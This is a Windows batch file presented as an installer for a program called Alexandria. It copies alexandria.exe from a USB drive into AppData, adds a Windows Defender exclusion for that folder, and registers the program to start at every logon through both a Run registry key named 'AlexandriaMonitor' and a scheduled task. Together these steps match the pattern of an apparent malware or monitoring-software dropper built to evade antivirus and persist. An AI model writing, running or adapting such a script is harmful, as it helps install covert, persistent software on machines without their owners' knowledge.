@echo off
chcp 65001 >nul
title Alexandria Installer

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Please right-click this file and select "Run as administrator".
    pause
    exit /b
)

echo [*] Installing Alexandria...

set TARGET=%APPDATA%\Alexandria
mkdir "%TARGET%" 2>nul
mkdir "%TARGET%\logs" 2>nul
copy /Y "%~dp0alexandria.exe" "%TARGET%\alexandria.exe" >nul

echo [*] Adding Windows Defender exclusion...
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%'" 2>nul

echo [*] Creating Run Key...
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AlexandriaMonitor /t REG_SZ /d "%TARGET%\alexandria.exe" /f >nul

echo [*] Creating Scheduled Task...
schtasks /Create /SC ONLOGON /TN "AlexandriaTask" /TR "%TARGET%\alexandria.exe" /RL LIMITED /F >nul 2>&1

echo [*] Starting Alexandria...
start "" "%TARGET%\alexandria.exe"

echo.
echo [OK] Alexandria installed and running.
echo [OK] You can now remove the USB drive.
timeout /t 5
exit